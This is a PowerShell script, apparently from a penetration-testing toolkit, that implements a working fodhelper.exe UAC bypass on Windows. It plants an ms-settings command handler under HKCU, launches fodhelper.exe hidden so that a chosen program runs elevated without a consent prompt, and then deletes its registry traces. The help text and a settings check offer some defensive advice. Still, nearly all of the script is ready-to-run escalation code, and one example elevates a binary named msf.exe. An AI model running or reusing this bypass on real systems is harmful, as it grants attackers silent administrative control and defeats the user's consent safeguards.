Function Invoke-FodhelperBypass {
<#
.SYNOPSIS
This function is used to bypass UAC restrictions for the currently logged in user with administrative privileges. When C:\Windows\System32\fodhelper.exe is run, the process first checks the registry value of the current user. If the registry location does not exist it moves on from HKCU to HKCR (HKEY Classes Root). This bypass method exploits this creating the registry value that is searched for first when the process is executed. In the fodhelper.exe application manifest we can see that fodhelper.exe has two flags set that make this possible. This first is the RequestedExecutionLevel which is set to "Require Administrator" and the second is AutoElevate which is set to "True". This means the application can only be run by an administrator and it can elevate privileges without prompting for credentials. To protect your computer from this bypass, don't sign into your computer with an account that has admin privileges. Also set HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System value ConsentPromptBehaviorAdmin to 1 or 2.


.PARAMETER Program
Specify the absolute or relative path for executable or application you wish to run with elevated permissions. Specifies a local script that this cmdlet runs with elevated permissions. The script must exist on the local  computer or in a directory that the local computer can access.


.DESCRIPTION
This cmdlet is used to open an application with full administrative privileges for the currently logged in administrative user. If the registry settings are not configured to prevent this from working it will mention what can be done to prevent this from working.


.EXAMPLE
Invoke-FodHelperBypass -Program 'powershell.exe'
# This command opens PowerShell in a new window with elevated privileges.

.EXAMPLE
Invoke-FodHelperBypass -Program "cmd /c start powershell.exe"
# This command also opens PowerShell in a new window with elevated privileges

.EXAMPLE
Invoke-FodHelperBypass -Program 'C:\Windows\System32\spool\drivers\color\msf.exe'
# This example executes the msf.exe application with elevated privileges


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
None


.OUTPUTS
None
#>
    [CmdletBinding()]
        Param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeLine=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage='Enter an executable you wish to execute to gain privesc. Default value is cmd /c start powershell.exe')]  # End Parameter
        [String]$Program = "cmd /c start powershell.exe")  # End param

BEGIN {

    $Value = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -Property "ConsentPromptBehaviorAdmin"
    Switch ($Value.ConsentPromptBehaviorAdmin) {

        0 { $Message = "0 : Elevate without prompting" }
        1 { $Message = "1 : Prompt for credentials on the secure desktop" }
        2 { $Message = "2 : Prompt for consent on the secure desktop" }
        3 { $Message = "3 : Prompt for credentials"}
        4 { $Message = "4 : Prompt for consent"}
        5 { $Message = "5 : Prompt for consent for non-Windows binaries"}

    }  # End Switch

    If (($Value.ConsentPromptBehaviorAdmin -eq 1) -or ($Value.ConsentPromptBehaviorAdmin -eq 2)) {

        Throw "[x] This device is not vulnerable to the fodhelper UAC bypass method. `nUAC Settings: $Message"

    } Else {

        Write-Warning -Message "This device is vulnerable to the fodhelper bypass method. `nCurrent UAC Settings: $Message"
        Write-Output -InputObject "[*] To defend against the fodhelper UAC bypass there are 2 precautions to take.`n1.) Do not sign in with a user who is a member of the local administraors group. `n2.) Change HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System's values ConsentPromptBehaviorAdmin to a value of 1 or 2."

    }  # End Else

    Write-Verbose -Message "Adding registry values..."

    New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "(default)" -Value $Program -Force

} PROCESS{

    Write-Verbose -Message "Executing fodhelper.exe and $Program..."
    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

} END {

    Write-Verbose -Message "Removing registry values as they should be no longer needed..."

    Start-Sleep -Seconds 3
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

}  # End BPE

}  # End Function Invoke-FodHelperBypass
